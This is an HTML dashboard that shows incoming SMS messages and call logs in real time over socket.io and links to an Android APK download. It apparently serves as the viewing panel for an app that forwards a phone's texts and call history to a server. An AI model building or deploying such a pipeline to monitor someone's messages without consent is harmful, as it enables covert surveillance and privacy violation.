<!DOCTYPE html>
<html>
<head>
  <title>SMS & Call Logs (Real-time)</title>
  <script src="https://cdn.socket.io/4.7.1/socket.io.min.js"></script>

  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    h2 { margin-top: 30px; }

    ul { list-style: none; padding: 0; }
    li {
      padding: 8px;
      border-bottom: 1px solid #ddd;
    }

    .incoming { color: green; }
    .outgoing { color: blue; }
    .missed { color: red; }
  </style>
</head>
<body>

  <h1>ðŸ“¡ Real-time Dashboard</h1>

  <!-- âœ… DOWNLOAD BUTTON -->
  <button onclick="downloadApk()">â¬‡ Download Android App</button>

  <!-- âœ… SMS SECTION -->
  <h2>ðŸ“© SMS Messages</h2>
  <ul id="messages"></ul>

  <!-- âœ… CALL LOG SECTION -->
  <h2>ðŸ“ž Call Logs</h2>
  <ul id="calls"></ul>

  <script>
    const socket = io();

    /* ====================
       REAL-TIME SMS
    ==================== */
    socket.on("new_sms", (sms) => {
      const li = document.createElement("li");
      li.textContent =
        `[${new Date(sms.receivedAt).toLocaleTimeString()}] ${sms.sender}: ${sms.message}`;
      document.getElementById("messages").prepend(li);
    });

    /* ====================
       REAL-TIME CALL LOGS
    ==================== */
    socket.on("new_call_log", (call) => {
      const li = document.createElement("li");

      const time = new Date(call.date).toLocaleString();

      li.className = call.type.toLowerCase();
      li.textContent =
        `[${time}] ${call.type} | ${call.number} | ${call.duration}s`;

      document.getElementById("calls").prepend(li);
    });

    function downloadApk() {
      window.location.href = "/download-apk";
    }
  </script>

</body>
</html>
